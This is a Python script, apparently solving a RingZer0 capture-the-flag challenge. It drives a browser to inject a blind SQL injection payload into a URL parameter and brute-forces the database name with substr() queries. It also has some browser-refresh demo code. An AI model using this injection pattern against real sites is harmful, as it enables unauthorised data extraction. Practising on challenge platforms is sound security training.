import time
from Tools.utils import *
from Tools.BrowserTool import BrowserTool
import Tools.SQLiTool
import Tools.XSSTool
import Tools.CryptoTool
from main import *
from IPython.terminal.embed import InteractiveShellEmbed
import base64

banner = '*** Nested interpreter ***'
exit_msg = '*** Back in main IPython. Call ipshell() to restart ***'
ipshell = InteractiveShellEmbed(banner1=banner, exit_msg=exit_msg)
ipshell.set_autoindent()

def example():
    for i in range(0,10):
        mainBrowserTool.browser.refresh()
        time.sleep(1)
    mainBrowserTool.browser.get("http://www.google.com")
    time.sleep(1)
    mainBrowserTool.browser.get("http://hotmail.com")

def example_get():
    mainBrowserTool.browser.get("http://www.google.com")

example()
time.sleep(1)
example_get()


def chal_79(text):
    mainBrowserTool.browser.get('https://ringzer0team.com/challenges/79/?u=admi" or "(' + text + ')"="1')
    message = mainBrowserTool.browser.find_element_by_class_name('challenge-wrapper').text
    if "does not exists." in message:
        return False
    else:
        return True

def do_challenge_79():
    sql_query = "substr(( SELECT database() ),1,[count])='[letters]'"
    Tools.SQLiTool.general_brute_force_substr(chal_79, sql_query,"",number=True,lower=True,upper=True)


